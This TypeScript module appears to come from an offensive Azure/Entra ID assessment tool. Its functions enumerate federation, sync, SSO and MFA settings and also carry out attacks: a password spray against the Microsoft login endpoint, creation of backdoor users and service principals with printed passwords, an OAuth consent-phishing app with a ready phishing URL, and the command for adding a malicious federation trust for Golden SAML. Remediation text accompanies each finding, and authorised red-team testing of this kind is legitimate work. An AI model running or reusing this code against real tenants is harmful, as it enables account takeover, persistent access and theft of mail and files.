import { az, run, argVal, hasFlag, tryJson } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function federationBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const domain = argVal(args, "--domain")
  const idpUrl = argVal(args, "--idp-url")
  const findings: Finding[] = []
  const output: string[] = ["[*] Enumerating federation configuration...\n"]

  const domains = await az(
    ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/domains"],
    undefined,
    timeout,
  )
  if (domains.exitCode !== 0) return { output: `[-] Failed to enumerate domains: ${domains.stderr.trim()}`, findings }
  const domainList = tryJson(domains.stdout)?.value || []
  const federated = domainList.filter((d: Record<string, unknown>) => d.authenticationType === "Federated")
  output.push(`[+] Total domains: ${domainList.length}`)
  output.push(`[+] Federated domains: ${federated.length}`)
  for (const d of federated) {
    output.push(`    ${d.id} — federated (isDefault: ${d.isDefault})`)
    findings.push({
      checkId: "AZ-FED-001",
      provider: "azure",
      severity: "info",
      status: "INFO",
      resource: `domain://${d.id}`,
      title: `Federated domain: ${d.id}`,
      details: `Authentication: ${d.authenticationType}, isVerified: ${d.isVerified}`,
      remediation: "Review federation trust configuration",
    })
  }

  if (domain && idpUrl) {
    output.push(`\n[*] Would add federation trust for ${domain} → ${idpUrl}`)
    output.push(
      `[*] Command: az rest --method POST --url "https://graph.microsoft.com/v1.0/domains/${domain}/federationConfiguration"`,
    )
    output.push(
      `[*] Body: {"issuerUri":"${idpUrl}","passiveSignInUri":"${idpUrl}/saml2","preferredAuthenticationProtocol":"saml"}`,
    )
    findings.push({
      checkId: "AZ-FED-002",
      provider: "azure",
      severity: "critical",
      status: "READY",
      resource: `domain://${domain}`,
      title: `Federation backdoor ready: ${domain} → ${idpUrl}`,
      details: "Adding malicious IdP enables Golden SAML — forge tokens for any user",
      remediation: "Remove unauthorized federation trusts from domain configuration",
    })
  }

  if (federated.length === 0 && !domain) {
    output.push("\n[*] No federated domains found — federation backdoor not applicable")
    output.push("[*] Use --domain DOMAIN --idp-url URL to add a malicious federation trust")
  }

  return { output: output.join("\n"), findings }
}

export async function ptaAbuse(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Enumerating Pass-Through Authentication agents...\n"]

  const agents = await az(
    [
      "rest",
      "--method",
      "GET",
      "--url",
      "https://graph.microsoft.com/v1.0/onPremisesPublishingProfiles/provisioning/agents",
    ],
    undefined,
    timeout,
  )
  if (agents.exitCode === 0) {
    const items = tryJson(agents.stdout)?.value || []
    output.push(`[+] PTA agents found: ${items.length}`)
    for (const a of items) {
      output.push(`    ${a.machineName || a.id} — status: ${a.status}, version: ${a.publishingType || "unknown"}`)
      if (a.status === "active") {
        findings.push({
          checkId: "AZ-PTA-001",
          provider: "azure",
          severity: "high",
          status: "FAIL",
          resource: `pta-agent://${a.machineName || a.id}`,
          title: `Active PTA agent: ${a.machineName || a.id}`,
          details:
            "PTA agents intercept authentication in real-time — compromising this host enables credential interception for all cloud auth",
          remediation: "Ensure PTA agent hosts are hardened, monitored, and treated as Tier 0 assets",
        })
      }
    }
  } else {
    output.push("[-] Could not enumerate PTA agents (may require higher privileges)")
    output.push("[*] Checking organization sync status instead...")
  }

  const org = await az(
    [
      "rest",
      "--method",
      "GET",
      "--url",
      "https://graph.microsoft.com/v1.0/organization?$select=onPremisesSyncEnabled,onPremisesLastSyncDateTime,verifiedDomains",
    ],
    undefined,
    timeout,
  )
  if (org.exitCode === 0) {
    const orgs = tryJson(org.stdout)?.value || []
    for (const o of orgs) {
      output.push(`\n[+] Org sync enabled: ${o.onPremisesSyncEnabled || false}`)
      output.push(`    Last sync: ${o.onPremisesLastSyncDateTime || "never"}`)
      if (o.onPremisesSyncEnabled) {
        findings.push({
          checkId: "AZ-PTA-002",
          provider: "azure",
          severity: "medium",
          status: "INFO",
          resource: "organization://sync",
          title: "On-premises sync enabled — PTA may be in use",
          details: `Last sync: ${o.onPremisesLastSyncDateTime || "unknown"}. Hybrid identity increases attack surface`,
          remediation: "Verify PTA agent security posture, consider migrating to password hash sync",
        })
      }
    }
  }

  return { output: output.join("\n"), findings }
}

export async function aadconnectDump(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Enumerating Azure AD Connect configuration...\n"]

  const org = await az(
    [
      "rest",
      "--method",
      "GET",
      "--url",
      "https://graph.microsoft.com/v1.0/organization?$select=onPremisesSyncEnabled,onPremisesLastSyncDateTime,onPremisesLastPasswordSyncDateTime",
    ],
    undefined,
    timeout,
  )
  if (org.exitCode === 0) {
    const orgs = tryJson(org.stdout)?.value || []
    for (const o of orgs) {
      const syncEnabled = o.onPremisesSyncEnabled || false
      output.push(`[+] Directory sync enabled: ${syncEnabled}`)
      output.push(`    Last sync: ${o.onPremisesLastSyncDateTime || "never"}`)
      output.push(`    Last password sync: ${o.onPremisesLastPasswordSyncDateTime || "never"}`)

      if (syncEnabled) {
        findings.push({
          checkId: "AZ-AADC-001",
          provider: "azure",
          severity: "high",
          status: "INFO",
          resource: "aadconnect://sync",
          title: "Azure AD Connect sync is active",
          details: `Last sync: ${o.onPremisesLastSyncDateTime}. AADConnect server stores credentials and hash data — high-value target`,
          remediation: "Harden AADConnect server, restrict access, enable monitoring",
        })
      }
    }
  }

  const sp = await az(
    [
      "ad",
      "sp",
      "list",
      "--filter",
      "displayName eq 'Microsoft Azure AD Connect'",
      "--query",
      "[].{id:id,appId:appId,displayName:displayName}",
    ],
    undefined,
    timeout,
  )
  if (sp.exitCode === 0) {
    const sps = tryJson(sp.stdout) || []
    if (sps.length > 0) {
      output.push(`\n[+] AADConnect service principal found:`)
      for (const s of sps) {
        output.push(`    ${s.displayName} (appId: ${s.appId})`)
      }
      findings.push({
        checkId: "AZ-AADC-002",
        provider: "azure",
        severity: "high",
        status: "INFO",
        resource: `sp://${sps[0].appId}`,
        title: "AADConnect service principal active",
        details:
          "AADConnect sync account has DCSync-equivalent permissions. Compromising the AADConnect server allows extracting all password hashes",
        remediation: "Monitor AADConnect SP activity, restrict its permissions to minimum required",
      })
    }
  }

  const syncSp = await az(
    [
      "ad",
      "sp",
      "list",
      "--filter",
      "startswith(displayName, 'Sync_')",
      "--query",
      "[].{id:id,displayName:displayName,appId:appId}",
    ],
    undefined,
    timeout,
  )
  if (syncSp.exitCode === 0) {
    const syncs = tryJson(syncSp.stdout) || []
    if (syncs.length > 0) {
      output.push(`\n[+] Sync accounts found:`)
      for (const s of syncs) {
        output.push(`    ${s.displayName} (appId: ${s.appId})`)
        findings.push({
          checkId: "AZ-AADC-003",
          provider: "azure",
          severity: "critical",
          status: "FAIL",
          resource: `sp://${s.appId}`,
          title: `AADConnect sync account: ${s.displayName}`,
          details: "Sync_ prefixed accounts have directory replication permissions — can perform DCSync equivalent",
          remediation: "Ensure sync accounts are monitored for abuse, rotate credentials regularly",
        })
      }
    }
  }

  return { output: output.join("\n"), findings }
}

export async function seamlessSsoAbuse(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Enumerating Seamless SSO configuration...\n"]

  const policy = await az(
    ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/policies/authenticationFlowsPolicy"],
    undefined,
    timeout,
  )
  if (policy.exitCode === 0) {
    const p = tryJson(policy.stdout)
    output.push(`[+] Authentication flows policy retrieved`)
    if (p?.selfServiceSignUp?.isEnabled !== undefined) {
      output.push(`    Self-service sign-up: ${p.selfServiceSignUp.isEnabled}`)
    }
  }

  const org = await az(
    [
      "rest",
      "--method",
      "GET",
      "--url",
      "https://graph.microsoft.com/v1.0/organization?$select=onPremisesSyncEnabled,verifiedDomains",
    ],
    undefined,
    timeout,
  )
  if (org.exitCode === 0) {
    const orgs = tryJson(org.stdout)?.value || []
    for (const o of orgs) {
      if (o.onPremisesSyncEnabled) {
        output.push(`\n[+] Hybrid identity detected — Seamless SSO likely configured`)
        output.push(`[*] Seamless SSO uses the AZUREADSSOACC computer account Kerberos key`)
        output.push(`[*] If the key is extracted, silver tickets can be forged for any user`)
        findings.push({
          checkId: "AZ-SSO-001",
          provider: "azure",
          severity: "high",
          status: "INFO",
          resource: "seamless-sso://AZUREADSSOACC",
          title: "Seamless SSO likely enabled (hybrid identity active)",
          details:
            "The AZUREADSSOACC computer account's Kerberos decryption key enables forging authentication tickets for any Azure AD user",
          remediation: "Rotate AZUREADSSOACC Kerberos key every 30 days, monitor for anomalous ticket requests",
        })
      }
    }
  }

  const azureadssoacc = await az(
    ["ad", "sp", "list", "--filter", "displayName eq 'AZUREADSSOACC'", "--query", "[].{id:id,displayName:displayName}"],
    undefined,
    timeout,
  )
  if (azureadssoacc.exitCode === 0) {
    const accounts = tryJson(azureadssoacc.stdout) || []
    if (accounts.length > 0) {
      output.push(`\n[+] AZUREADSSOACC service principal found — Seamless SSO is CONFIRMED`)
      findings.push({
        checkId: "AZ-SSO-002",
        provider: "azure",
        severity: "critical",
        status: "FAIL",
        resource: "seamless-sso://AZUREADSSOACC",
        title: "Seamless SSO confirmed via AZUREADSSOACC SP",
        details:
          "Extract the Kerberos key from on-prem AD to forge authentication tickets. Key is in the AZUREADSSOACC$ computer account",
        remediation: "Rotate key: Update-AzureADSSOForest in PowerShell, monitor key usage",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function samlForge(args: string[], timeout: number): Promise<HookResult> {
  const targetDomain = argVal(args, "--domain")
  const findings: Finding[] = []
  const output: string[] = ["[*] Enumerating SAML/Federation configurations for Golden SAML assessment...\n"]

  const domains = await az(
    ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/domains"],
    undefined,
    timeout,
  )
  if (domains.exitCode !== 0) return { output: `[-] Failed to enumerate domains: ${domains.stderr.trim()}`, findings }

  const domainList = tryJson(domains.stdout)?.value || []
  const federated = domainList.filter((d: Record<string, unknown>) => d.authenticationType === "Federated")

  if (federated.length === 0) {
    output.push("[*] No federated domains found — Golden SAML not applicable in managed-only environments")
    return { output: output.join("\n"), findings }
  }

  output.push(`[+] Federated domains: ${federated.length}`)
  for (const d of federated) {
    if (targetDomain && d.id !== targetDomain) continue

    output.push(`\n[+] Domain: ${d.id} (isDefault: ${d.isDefault})`)

    const fedConfig = await az(
      ["rest", "--method", "GET", "--url", `https://graph.microsoft.com/v1.0/domains/${d.id}/federationConfiguration`],
      undefined,
      timeout,
    )
    if (fedConfig.exitCode === 0) {
      const configs = tryJson(fedConfig.stdout)?.value || []
      for (const fc of configs) {
        output.push(`    IdP: ${fc.issuerUri || "unknown"}`)
        output.push(`    Sign-in URL: ${fc.passiveSignInUri || "unknown"}`)
        output.push(`    Protocol: ${fc.preferredAuthenticationProtocol || "unknown"}`)
        output.push(
          `    Signing cert: ${fc.signingCertificate ? `${fc.signingCertificate.substring(0, 40)}...` : "not accessible"}`,
        )

        findings.push({
          checkId: "AZ-SAML-001",
          provider: "azure",
          severity: "critical",
          status: "INFO",
          resource: `federation://${d.id}`,
          title: `Federation config for ${d.id} — Golden SAML target`,
          details: `IdP: ${fc.issuerUri}. If the ADFS token signing certificate is extracted, any user token can be forged`,
          remediation: "Rotate ADFS token signing certificate, monitor for anomalous SAML assertions",
        })
      }
    } else {
      output.push(`    [-] Could not get federation config (need higher privileges)`)
      const metadata = `https://login.microsoftonline.com/${d.id}/federationmetadata/2007-06/federationmetadata.xml`
      output.push(`    [*] Federation metadata URL: ${metadata}`)
    }
  }

  output.push(`\n[*] Golden SAML attack path:`)
  output.push(`    1. Extract ADFS token signing certificate (from ADFS server)`)
  output.push(`    2. Use certificate to forge SAML assertions for any user`)
  output.push(`    3. Present forged assertion to Azure AD for access tokens`)

  return { output: output.join("\n"), findings }
}

export async function mfaManipulation(args: string[], timeout: number): Promise<HookResult> {
  const targetUser = argVal(args, "--user")
  const findings: Finding[] = []
  const output: string[] = ["[*] Enumerating MFA configuration...\n"]

  const methodsPolicy = await az(
    ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/policies/authenticationMethodsPolicy"],
    undefined,
    timeout,
  )
  if (methodsPolicy.exitCode === 0) {
    const policy = tryJson(methodsPolicy.stdout)
    const configs = policy?.authenticationMethodConfigurations || []
    output.push(`[+] Authentication method configurations: ${configs.length}`)
    for (const c of configs) {
      const state = c.state || "unknown"
      output.push(`    ${c.id}: ${state}`)
      if (state === "enabled" && (c.id === "sms" || c.id === "voice")) {
        findings.push({
          checkId: "AZ-MFA-001",
          provider: "azure",
          severity: "medium",
          status: "FAIL",
          resource: `mfa-method://${c.id}`,
          title: `Weak MFA method enabled: ${c.id}`,
          details: `${c.id} authentication is enabled — susceptible to SIM swapping and interception`,
          remediation: `Disable ${c.id} as an authentication method, prefer authenticator apps or FIDO2`,
        })
      }
    }
  }

  if (targetUser) {
    const userMethods = await az(
      [
        "rest",
        "--method",
        "GET",
        "--url",
        `https://graph.microsoft.com/v1.0/users/${targetUser}/authentication/methods`,
      ],
      undefined,
      timeout,
    )
    if (userMethods.exitCode === 0) {
      const methods = tryJson(userMethods.stdout)?.value || []
      output.push(`\n[+] MFA methods for ${targetUser}: ${methods.length}`)
      for (const m of methods) {
        output.push(`    ${m["@odata.type"]?.replace("#microsoft.graph.", "") || m.id}`)
      }
      if (methods.length <= 1) {
        findings.push({
          checkId: "AZ-MFA-002",
          provider: "azure",
          severity: "high",
          status: "FAIL",
          resource: `user://${targetUser}`,
          title: `User has weak/no MFA: ${targetUser}`,
          details: `Only ${methods.length} auth method(s) registered — account vulnerable to credential-based attacks`,
          remediation: "Register additional MFA methods for this user",
        })
      }
    }
  } else {
    const registration = await az(
      [
        "rest",
        "--method",
        "GET",
        "--url",
        "https://graph.microsoft.com/v1.0/reports/authenticationMethods/userRegistrationDetails?$filter=isMfaRegistered eq false&$top=50",
      ],
      undefined,
      timeout,
    )
    if (registration.exitCode === 0) {
      const users = tryJson(registration.stdout)?.value || []
      output.push(`\n[+] Users without MFA (first 50): ${users.length}`)
      for (const u of users.slice(0, 20)) {
        output.push(`    ${u.userPrincipalName} — MFA: ${u.isMfaRegistered}, SSPR: ${u.isSsprRegistered}`)
      }
      if (users.length > 0) {
        findings.push({
          checkId: "AZ-MFA-003",
          provider: "azure",
          severity: "high",
          status: "FAIL",
          resource: "entra://mfa-registration",
          title: `${users.length}+ users without MFA registered`,
          details: "Users without MFA are vulnerable to credential stuffing, phishing, and brute force",
          remediation: "Enforce MFA registration via Conditional Access policies",
        })
      }
    }
  }

  return { output: output.join("\n"), findings }
}

export async function userCreation(args: string[], timeout: number): Promise<HookResult> {
  const upn = argVal(args, "--upn")
  const displayName = argVal(args, "--display-name") || "CS-TestUser"
  const password = argVal(args, "--password")
  const role = argVal(args, "--role")
  const createSp = hasFlag(args, "--service-principal")
  const findings: Finding[] = []
  const output: string[] = ["[*] Rogue identity creation...\n"]

  if (createSp) {
    const spName = argVal(args, "--name") || "cs-backdoor-sp"
    const spArgs = ["ad", "sp", "create-for-rbac", "--name", spName, "--skip-assignment"]
    if (role) spArgs.push("--role", role)
    const sp = await az(spArgs, undefined, timeout)
    if (sp.exitCode === 0) {
      const creds = tryJson(sp.stdout)
      output.push(`[+] Service principal created:`)
      output.push(`    Name: ${spName}`)
      output.push(`    AppId: ${creds?.appId}`)
      output.push(`    Password: ${creds?.password}`)
      output.push(`    Tenant: ${creds?.tenant}`)
      findings.push({
        checkId: "AZ-USER-001",
        provider: "azure",
        severity: "critical",
        status: "EXPLOITED",
        resource: `sp://${creds?.appId}`,
        title: `Rogue service principal created: ${spName}`,
        details: `AppId: ${creds?.appId}, role: ${role || "none"}. Use for persistent access`,
        remediation: `Delete: az ad sp delete --id ${creds?.appId}`,
      })
    } else {
      output.push(`[-] SP creation failed: ${sp.stderr.trim()}`)
    }
    return { output: output.join("\n"), findings }
  }

  if (!upn || !password) {
    output.push("[!] Required: --upn USER@DOMAIN --password PASS [--display-name NAME] [--role ROLE]")
    output.push("[*] Or use --service-principal --name NAME [--role ROLE] for SP creation")
    return { output: output.join("\n"), findings }
  }

  const create = await az(
    [
      "ad",
      "user",
      "create",
      "--display-name",
      displayName,
      "--user-principal-name",
      upn,
      "--password",
      password,
      "--force-change-password-next-sign-in",
      "false",
    ],
    undefined,
    timeout,
  )

  if (create.exitCode === 0) {
    const user = tryJson(create.stdout)
    output.push(`[+] User created:`)
    output.push(`    UPN: ${upn}`)
    output.push(`    ObjectId: ${user?.id}`)
    output.push(`    Password: ${password}`)

    if (role) {
      const assign = await az(["role", "assignment", "create", "--assignee", upn, "--role", role], undefined, timeout)
      if (assign.exitCode === 0) {
        output.push(`[+] Role assigned: ${role}`)
      } else {
        output.push(`[-] Role assignment failed: ${assign.stderr.trim()}`)
      }
    }

    findings.push({
      checkId: "AZ-USER-002",
      provider: "azure",
      severity: "critical",
      status: "EXPLOITED",
      resource: `user://${upn}`,
      title: `Rogue user created: ${upn}`,
      details: `ObjectId: ${user?.id}, role: ${role || "none"}`,
      remediation: `Delete: az ad user delete --id ${user?.id}`,
    })
  } else {
    output.push(`[-] User creation failed: ${create.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

export async function passwordSpray(args: string[], timeout: number): Promise<HookResult> {
  const user = argVal(args, "--user")
  const userList = argVal(args, "--username-list")
  const password = argVal(args, "--password") || "Password123!"
  const tenant = argVal(args, "--tenant") || "common"
  const delay = parseInt(argVal(args, "--delay") || "3", 10)
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure AD password spray...\n"]

  const users: string[] = []
  if (user) {
    users.push(user)
  } else if (userList) {
    try {
      const content = await Bun.file(userList).text()
      users.push(
        ...content
          .split("\n")
          .map((l) => l.trim())
          .filter(Boolean),
      )
    } catch {
      return { output: `[-] Cannot read user list: ${userList}`, findings }
    }
  } else {
    return {
      output: "[!] Required: --user USER or --username-list FILE [--password PASS] [--tenant TENANT] [--delay SECONDS]",
      findings,
    }
  }

  output.push(`[*] Target tenant: ${tenant}`)
  output.push(`[*] Users to test: ${users.length}`)
  output.push(`[*] Password: ${password}`)
  output.push(`[*] Delay between attempts: ${delay}s`)
  output.push("")

  let successes = 0
  let locked = 0
  const clientId = "04b07795-a71b-4346-935f-02f65e9a7b41"

  for (const u of users) {
    const result = await run(
      "curl",
      [
        "-s",
        "-X",
        "POST",
        `https://login.microsoftonline.com/${tenant}/oauth2/token`,
        "-d",
        `grant_type=password&client_id=${clientId}&username=${encodeURIComponent(u)}&password=${encodeURIComponent(password)}&resource=https://graph.microsoft.com`,
      ],
      timeout,
    )

    const body = tryJson(result.stdout)
    if (body?.access_token) {
      output.push(`[+] SUCCESS: ${u}`)
      successes++
      findings.push({
        checkId: "AZ-SPRAY-001",
        provider: "azure",
        severity: "critical",
        status: "EXPLOITED",
        resource: `user://${u}`,
        title: `Valid credentials found: ${u}`,
        details: `Password "${password}" is valid for this account. Token obtained`,
        remediation: "Force password reset, enable MFA, investigate for compromise",
      })
    } else if (body?.error_description?.includes("AADSTS50053")) {
      output.push(`[!] LOCKED: ${u}`)
      locked++
    } else if (body?.error_description?.includes("AADSTS50126")) {
      output.push(`[-] FAILED: ${u}`)
    } else if (body?.error_description?.includes("AADSTS50076") || body?.error_description?.includes("AADSTS50079")) {
      output.push(`[+] VALID (MFA required): ${u}`)
      successes++
      findings.push({
        checkId: "AZ-SPRAY-002",
        provider: "azure",
        severity: "high",
        status: "FAIL",
        resource: `user://${u}`,
        title: `Valid password (MFA blocks login): ${u}`,
        details: `Password "${password}" is correct but MFA is required. MFA bypass or social engineering needed`,
        remediation: "Force password reset for this user",
      })
    } else {
      const errCode = body?.error_description?.match(/AADSTS\d+/)?.[0] || "unknown"
      output.push(`[?] ${u}: ${errCode}`)
    }

    if (users.indexOf(u) < users.length - 1 && delay > 0) {
      await new Promise((r) => setTimeout(r, delay * 1000))
    }
  }

  output.push(`\n[*] Results: ${successes} valid, ${locked} locked, ${users.length - successes - locked} failed`)

  return { output: output.join("\n"), findings }
}

export async function tenantReconInsider(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Full insider Entra ID tenant reconnaissance...\n"]

  const org = await az(
    ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/organization"],
    undefined,
    timeout,
  )
  if (org.exitCode === 0) {
    const orgs = tryJson(org.stdout)?.value || []
    for (const o of orgs) {
      output.push(`[+] Organization: ${o.displayName}`)
      output.push(`    Tenant ID: ${o.id}`)
      output.push(`    Country: ${o.countryLetterCode || "unknown"}`)
      output.push(`    Sync enabled: ${o.onPremisesSyncEnabled || false}`)
      output.push(`    Last sync: ${o.onPremisesLastSyncDateTime || "N/A"}`)
      output.push(`    Created: ${o.createdDateTime || "unknown"}`)
      const domains = (o.verifiedDomains || [])
        .map((d: Record<string, string>) => `${d.name}${d.isDefault ? " (default)" : ""}`)
        .join(", ")
      output.push(`    Domains: ${domains}`)
      const plans = (o.assignedPlans || [])
        .filter((p: Record<string, string>) => p.capabilityStatus === "Enabled")
        .map((p: Record<string, string>) => p.service)
      const unique = [...new Set(plans)]
      output.push(`    Licensed services: ${unique.join(", ")}`)
    }
  }

  const users = await az(["ad", "user", "list", "--query", "length(@)"], undefined, timeout)
  if (users.exitCode === 0) {
    const count = tryJson(users.stdout)
    output.push(`\n[+] Total users: ${count}`)
  }

  const guests = await az(
    ["ad", "user", "list", "--filter", "userType eq 'Guest'", "--query", "length(@)"],
    undefined,
    timeout,
  )
  if (guests.exitCode === 0) {
    const count = tryJson(guests.stdout)
    output.push(`[+] Guest users: ${count}`)
    if (typeof count === "number" && count > 0) {
      findings.push({
        checkId: "AZ-TENANT-001",
        provider: "azure",
        severity: "medium",
        status: "INFO",
        resource: "entra://guests",
        title: `${count} guest users in tenant`,
        details: "Guest users may have excessive access to internal resources",
        remediation: "Review guest user access and implement access reviews",
      })
    }
  }

  const admins = await az(
    [
      "rest",
      "--method",
      "GET",
      "--url",
      "https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members?$select=displayName,userPrincipalName",
    ],
    undefined,
    timeout,
  )
  if (admins.exitCode === 0) {
    const members = tryJson(admins.stdout)?.value || []
    output.push(`\n[+] Global Administrators: ${members.length}`)
    for (const m of members) {
      output.push(`    ${m.userPrincipalName || m.displayName}`)
    }
    if (members.length > 5) {
      findings.push({
        checkId: "AZ-TENANT-002",
        provider: "azure",
        severity: "high",
        status: "FAIL",
        resource: "entra://global-admins",
        title: `Excessive Global Admins: ${members.length}`,
        details: "CIS recommends no more than 5 Global Administrators",
        remediation: "Reduce Global Admin count, use PIM for JIT access",
      })
    }
  }

  const apps = await az(["ad", "app", "list", "--all", "--query", "length(@)"], undefined, timeout)
  if (apps.exitCode === 0) {
    const count = tryJson(apps.stdout)
    output.push(`\n[+] App registrations: ${count}`)
  }

  const sps = await az(["ad", "sp", "list", "--all", "--query", "length(@)"], undefined, timeout)
  if (sps.exitCode === 0) {
    const count = tryJson(sps.stdout)
    output.push(`[+] Service principals: ${count}`)
  }

  const groups = await az(["ad", "group", "list", "--query", "length(@)"], undefined, timeout)
  if (groups.exitCode === 0) {
    const count = tryJson(groups.stdout)
    output.push(`[+] Groups: ${count}`)
  }

  const subs = await az(["account", "list", "--query", "length(@)"], undefined, timeout)
  if (subs.exitCode === 0) {
    const count = tryJson(subs.stdout)
    output.push(`[+] Subscriptions: ${count}`)
  }

  return { output: output.join("\n"), findings }
}

export async function consentPhish(args: string[], timeout: number): Promise<HookResult> {
  const appName = argVal(args, "--name") || "CS-OAuth-App"
  const redirectUri = argVal(args, "--redirect-uri") || "https://localhost/callback"
  const tenant = argVal(args, "--tenant") || "common"
  const execute = hasFlag(args, "--create")
  const findings: Finding[] = []
  const output: string[] = ["[*] Illicit consent grant / OAuth phishing setup...\n"]

  const authPolicy = await az(
    ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/policies/authorizationPolicy"],
    undefined,
    timeout,
  )
  if (authPolicy.exitCode === 0) {
    const policy = tryJson(authPolicy.stdout)
    const userConsent = policy?.defaultUserRolePermissions?.permissionGrantPoliciesAssigned || []
    output.push(`[+] User consent policies: ${JSON.stringify(userConsent)}`)
    const allowsConsent = userConsent.some(
      (p: string) => p.includes("user-default") || p.includes("ManagePermissionGrantsForSelf"),
    )
    if (allowsConsent) {
      output.push(`[+] Users CAN consent to apps — illicit consent grant is viable`)
      findings.push({
        checkId: "AZ-CONSENT-001",
        provider: "azure",
        severity: "high",
        status: "FAIL",
        resource: "entra://consent-policy",
        title: "User consent to apps is allowed",
        details: "Users can grant OAuth permissions to third-party apps. Enables illicit consent grant phishing",
        remediation:
          "Restrict user consent: Entra ID > Enterprise Apps > Consent and Permissions > Do not allow user consent",
      })
    } else {
      output.push(`[-] User consent is restricted — admin consent required`)
    }
  }

  if (execute) {
    const create = await az(
      [
        "ad",
        "app",
        "create",
        "--display-name",
        appName,
        "--web-redirect-uris",
        redirectUri,
        "--required-resource-accesses",
        JSON.stringify([
          {
            resourceAppId: "00000003-0000-0000-c000-000000000000",
            resourceAccess: [
              { id: "e1fe6dd8-ba31-4d61-89e7-88639da4683d", type: "Scope" },
              { id: "024d486e-b451-40bb-833d-3e66d98c5c73", type: "Scope" },
              { id: "570282fd-fa5c-430d-a7fd-fc8dc98a9dca", type: "Scope" },
              { id: "7427e0e9-2fba-42fe-b0c0-848c9e6a8182", type: "Scope" },
            ],
          },
        ]),
      ],
      undefined,
      timeout,
    )

    if (create.exitCode === 0) {
      const app = tryJson(create.stdout)
      const appId = app?.appId
      const consentUrl = `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/authorize?client_id=${appId}&response_type=code&redirect_uri=${encodeURIComponent(redirectUri)}&scope=User.Read+Mail.Read+Files.Read+Contacts.Read&response_mode=query`

      output.push(`\n[+] OAuth phishing app created:`)
      output.push(`    Name: ${appName}`)
      output.push(`    AppId: ${appId}`)
      output.push(`    ObjectId: ${app?.id}`)
      output.push(`\n[+] Consent phishing URL:`)
      output.push(`    ${consentUrl}`)
      output.push(`\n[*] Permissions requested: User.Read, Mail.Read, Files.Read, Contacts.Read`)

      findings.push({
        checkId: "AZ-CONSENT-002",
        provider: "azure",
        severity: "critical",
        status: "EXPLOITED",
        resource: `app://${appId}`,
        title: `Consent phishing app created: ${appName}`,
        details: `AppId: ${appId}. Send the consent URL to targets for credential/data access`,
        remediation: `Delete: az ad app delete --id ${app?.id}`,
      })
    } else {
      output.push(`[-] App creation failed: ${create.stderr.trim()}`)
    }
  } else {
    output.push(`\n[*] Use --create to create the phishing app`)
    output.push(`[*] Will request: User.Read, Mail.Read, Files.Read, Contacts.Read`)
  }

  return { output: output.join("\n"), findings }
}
